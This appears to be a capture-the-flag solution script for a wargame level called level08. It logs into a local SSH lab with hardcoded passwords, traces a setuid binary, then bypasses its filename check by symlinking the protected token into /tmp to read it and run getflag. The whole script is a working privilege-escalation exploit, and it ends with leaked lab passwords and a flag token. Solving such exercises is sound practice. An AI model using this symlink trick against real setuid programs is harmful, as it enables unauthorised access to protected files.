#!/bin/bash
ssh() {
    sshpass -p 'fiumuikeil55xe9cu4dood66h' ssh level08@localhost -p 2220 "$1"  
}

ssh "ls -la"

ssh "getfacl ./level08"

ssh 'getfacl token' 

ssh 'ltrace ./level08 token'

ssh './level08 token'

read pause

ssh 'ln -s ~/token /tmp/flag && ./level08 /tmp/flag'

ssh 'ls -la /tmp/flag'

sshpass -p 'quif5eloekouj29ke0vouxean' ssh flag08@localhost -p 2220 "getflag"  


#Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f